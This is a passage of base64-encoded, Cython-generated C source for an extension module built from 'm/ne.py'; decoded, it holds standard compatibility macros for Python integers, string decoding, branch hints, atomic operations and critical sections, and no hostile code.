iAgI2lmbmRlZiBfUHlMb25nX1NJR05fTUFTSwogICAgI2RlZmluZSBfUHlMb25nX1NJR05fTUFTSyAzCiAgI2VuZGlmCiAgI2lmbmRlZiBfUHlMb25nX05PTl9TSVpFX0JJVFMKICAgICNkZWZpbmUgX1B5TG9uZ19OT05fU0laRV9CSVRTIDMKICAjZW5kaWYKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19TaWduKHgpICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyAmIF9QeUxvbmdfU0lHTl9NQVNLKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTmVnKHgpICAoKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMikgIT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05vbk5lZyh4KSAgKCFfX1B5eF9QeUxvbmdfSXNOZWcoeCkpCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNaZXJvKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgJiAxKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzUG9zKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgPT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSAgKF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSAgKChQeV9zc2l6ZV90KSAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyA+PiBfUHlMb25nX05PTl9TSVpFX0JJVFMpKQogICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeClcCiAgICAgICAgKCgxIC0gKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19TaWduKHgpKSAqIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKQogICNpZiBkZWZpbmVkKFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QpICYmIGRlZmluZWQoUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSkKICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgUHlVbnN0YWJsZV9Mb25nX0lzQ29tcGFjdCgoUHlMb25nT2JqZWN0KikgeCkKICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSAgUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSgoUHlMb25nT2JqZWN0KikgeCkKICAjZWxzZQogICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpICAgICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyA8ICgyIDw8IF9QeUxvbmdfTk9OX1NJWkVfQklUUykpCiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkgICgoMSAtIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfU2lnbih4KSkgKiAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkKICAjZW5kaWYKICB0eXBlZGVmIFB5X3NzaXplX3QgIF9fUHl4X2NvbXBhY3RfcHlsb25nOwogIHR5cGVkZWYgc2l6ZV90ICBfX1B5eF9jb21wYWN0X3VweWxvbmc7CiAgI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05lZyh4KSAgKFB5X1NJWkUoeCkgPCAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTm9uTmVnKHgpICAoUHlfU0laRSh4KSA+PSAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKFB5X1NJWkUoeCkgPT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1Bvcyh4KSAgKFB5X1NJWkUoeCkgPiAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZVVuc2lnbmVkKHgpICAoKFB5X1NJWkUoeCkgPT0gMCkgPyAwIDogX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICBfX1B5eF9zc3RfYWJzKFB5X1NJWkUoeCkpCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KSAgUHlfU0laRSh4KQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgKFB5X1NJWkUoeCkgPT0gMCB8fCBQeV9TSVpFKHgpID09IDEgfHwgUHlfU0laRSh4KSA9PSAtMSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeClcCiAgICAgICAgKChQeV9TSVpFKHgpID09IDApID8gKHNkaWdpdCkgMCA6ICgoUHlfU0laRSh4KSA8IDApID8gLShzZGlnaXQpX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSA6IChzZGlnaXQpX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkpCiAgdHlwZWRlZiBzZGlnaXQgIF9fUHl4X2NvbXBhY3RfcHlsb25nOwogIHR5cGVkZWYgZGlnaXQgIF9fUHl4X2NvbXBhY3RfdXB5bG9uZzsKICAjZW5kaWYKICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSk7CiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTUKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUub2JfZGlnaXQpCiAgI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPm9iX2RpZ2l0KQogICNlbmRpZgojZW5kaWYKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjgKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZVVURjgoY19zdHIsIHNpemUsIE5VTEwpCiNlbGlmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIHNpemUpIFB5VW5pY29kZV9EZWNvZGVBU0NJSShjX3N0ciwgc2l6ZSwgTlVMTCkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZShjX3N0ciwgc2l6ZSwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcsIE5VTEwpCiNlbmRpZgoKCgojaWYgZGVmaW5lZChfX0dOVUNfXykgICAgICYmIChfX0dOVUNfXyA+IDIgfHwgKF9fR05VQ19fID09IDIgJiYgKF9fR05VQ19NSU5PUl9fID4gOTUpKSkKICAjZGVmaW5lIGxpa2VseSh4KSAgIF9fYnVpbHRpbl9leHBlY3QoISEoeCksIDEpCiAgI2RlZmluZSB1bmxpa2VseSh4KSBfX2J1aWx0aW5fZXhwZWN0KCEhKHgpLCAwKQojZWxzZSAKICAjZGVmaW5lIGxpa2VseSh4KSAgICh4KQogICNkZWZpbmUgdW5saWtlbHkoeCkgKHgpCiNlbmRpZiAKCiNpZmRlZiBfX2NwbHVzcGx1cwojaWYgX19jcGx1c3BsdXMgPiAyMDExMDNMCiNpbmNsdWRlIDx0eXBlX3RyYWl0cz4KI2VuZGlmCnRlbXBsYXRlIDx0eXBlbmFtZSBUPgpzdGF0aWMgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUoVCogcHRyKSB7CiNpZiBfX2NwbHVzcGx1cyA+IDIwMTEwM0wKICAgIGlmICgoc3RkOjppc190cml2aWFsbHlfZGVmYXVsdF9jb25zdHJ1Y3RpYmxlPFQ+Ojp2YWx1ZSkpCiNlbmRpZgogICAgICAgICpwdHIgPSBUKCk7CiAgICAodm9pZClwdHI7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUodm9pZCogcHRyKSB7ICh2b2lkKXB0cjsgfQojZW5kaWYKCgojaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBQeU9iamVjdCAqX19weXhfbSA9IE5VTEw7CiNlbmRpZgpzdGF0aWMgaW50IF9fcHl4X2xpbmVubzsKc3RhdGljIGludCBfX3B5eF9jbGluZW5vID0gMDsKc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBfX3B5eF9jZmlsZW5tID0gX19GSUxFX187CnN0YXRpYyBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZTsKCgoKc3RhdGljIGNvbnN0IGNoYXIqIGNvbnN0IF9fcHl4X2ZbXSA9IHsKICAibS9uZS5weSIsCn07CgoKI2luY2x1ZGUgPHB5dGhyZWFkLmg+CiNpZm5kZWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgQ1lUSE9OX0FUT01JQ1MgMQojZW5kaWYKI2RlZmluZSBfX1BZWF9DWVRIT05fQVRPTUlDU19FTkFCTEVEKCkgQ1lUSE9OX0FUT01JQ1MKI2RlZmluZSBfX1BZWF9HRVRfQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcoKSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwojZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBpbnQKI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgaW50CiNpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICAgKF9fU1REQ19WRVJTSU9OX18gPj0gMjAxMTEyTCkgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgICFkZWZpbmVkKF9fU1REQ19OT19BVE9NSUNTX18pKQogICAgI2luY2x1ZGUgPHN0ZGF0b21pYy5oPgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcCiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSkKICAgICNpbmNsdWRlIDxhdG9taWM+CiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgIChfX1NURENfVkVSU0lPTl9fID49IDIwMTExMkwpICYmXAogICAgICAgICAgICAgICAgICAgICAgICAhZGVmaW5lZChfX1NURENfTk9fQVRPTUlDU19fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKQogICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X3R5cGUgYXRvbWljX2ludAogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgYXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIGF0b21pY19mZXRjaF9hZGRfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9yZWxheGVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBhdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfYWNxX3JlbCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgYXRvbWljX2ZldGNoX3N1Yl9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgYXRvbWljX2ZldGNoX3N1Yih2YWx1ZSwgYXJnKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIGF0b21pY19jb21wYXJlX2V4Y2hhbmdlX3N0cm9uZyh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBhdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIGF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBtZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBhdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgbWVtb3J5X29yZGVyX2FjcXVpcmUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIpCiAgICAjZWxpZiBkZWZpbmVkKF9fUFlYX0RFQlVHX0FUT01JQ1MpCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIKICAgICNlbmRpZgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcClwKICAgICAgICAgICAgICAgICAgICAoZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTcwMCkpICYmXAogICAgICAgICAgICAgICAgICAgIEFUT01JQ19JTlRfTE9DS19GUkVFID09IDIpCiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBzdGQ6OmF0b21pY19pbnQKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHN0ZDo6YXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKHZhbHVlKSBzdGQ6OmF0b21pY19mZXRjaF9zdWJfZXhwbGljaXQodmFsdWUsIDEsIHN0ZDo6bWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgc3RkOjphdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZCkgc3RkOjphdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBzdGQ6OmF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3F1aXJlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBzdGQ6OmF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMrKyBhdG9taWNzIikKICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUykKICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiCiAgICAjZW5kaWYKI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKF9fR05VQ19fID49IDUgfHwgKF9fR05VQ19fID09IDQgJiZcCiAgICAgICAgICAgICAgICAgICAgKF9fR05VQ19NSU5PUl9fID4gMSB8fFwKICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPT0gMSAmJiBfX0dOVUNfUEFUQ0hMRVZFTF9fID49IDIpKSkpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDEpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCBhcmcpCiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoX19weXhfYXRvbWljX2ludF90eXBlKiB2YWx1ZSwgX19weXhfbm9uYXRvbWljX2ludF90eXBlKiBleHBlY3RlZCwgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGRlc2lyZWQpIHsKICAgICAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgb2xkID0gX19zeW5jX3ZhbF9jb21wYXJlX2FuZF9zd2FwKHZhbHVlLCAqZXhwZWN0ZWQsIGRlc2lyZWQpOwogICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkOwogICAgICAgICpleHBlY3RlZCA9IG9sZDsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDApCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKSBfX3N5bmNfbG9ja190ZXN0X2FuZF9zZXQodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX19zeW5jX2xvY2tfdGVzdF9hbmRfc2V0KHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIEdOVSBhdG9taWNzIgogICAgI2VuZGlmCiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIGRlZmluZWQoX01TQ19WRVIpCiAgICAjaW5jbHVkZSA8aW50cmluLmg+CiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBsb25nCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI3VuZGVmIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgbG9uZwogICAgI3ByYWdtYSBpbnRyaW5zaWMgKF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkLCBfSW50ZXJsb2NrZWRFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlLCBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyLCBfSW50ZXJsb2NrZWRFeGNoYW5nZVBvaW50ZXIpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC0xKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAtYXJnKQogICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7CiAgICAgICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZCA9IF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSh2YWx1ZSwgZGVzaXJlZCwgKmV4cGVjdGVkKTsKICAgICAgICBpbnQgcmVzdWx0ID0gb2xkID09ICpleHBlY3RlZDsKICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAwKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSAqKHZvaWQgKiB2b2xhdGlsZSAqKXZhbHVlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgMCwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgTVNWQyBhdG9taWNzIikKICAgICNlbmRpZgojZWxzZQogICAgI3VuZGVmIENZVEhPTl9BVE9NSUNTCiAgICAjZGVmaW5lIENZVEhPTl9BVE9NSUNTIDAKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIk5vdCB1c2luZyBhdG9taWNzIgogICAgI2VuZGlmCiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgX19weXhfYWRkX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSkKICAgICNkZWZpbmUgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpKQojZWxzZQogICAgI2RlZmluZSBfX3B5eF9hZGRfYWNxdWlzaXRpb25fY291bnQobWVtdmlldylcCiAgICAgICAgICAgIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudF9sb2NrZWQoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldyksIG1lbXZpZXctPmxvY2spCiAgICAjZGVmaW5lIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVwKICAgICAgICAgICAgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50X2xvY2tlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSwgbWVtdmlldy0+bG9jaykKI2VuZGlmCgoKI2luY2x1ZGUgPHN0cnVjdG1lbWJlci5oPgoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMShjcywgYXJnKSAodm9pZCljcwojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMihjcywgYXJnMSwgYXJnMikgKHZvaWQpY3MKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQxKGNzKQojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDIoY3MpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24gUHlDcml0aWNhbFNlY3Rpb24KI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjIgUHlDcml0aWNhbFNlY3Rpb24yCiNkZWZpbmUgX1